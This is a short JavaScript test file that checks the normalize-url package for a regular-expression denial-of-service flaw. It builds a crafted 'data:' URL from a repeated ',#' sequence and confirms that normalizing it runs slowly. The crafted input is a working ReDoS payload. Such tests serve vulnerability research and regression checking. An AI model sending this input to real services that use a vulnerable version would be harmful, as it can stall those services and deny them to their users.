const { expectRedos } = require("../utils");

test("ReDos in normalize-url", () => {
  const normalizeUrl = require("normalize-url");
  expectRedos({
    run: (input) => {
      try {
        normalizeUrl(input);
      } catch (e) {}
    },
    build: (n) => "data:" + ",#".repeat(n) + "\nx",
    n: 1000,
  });
});
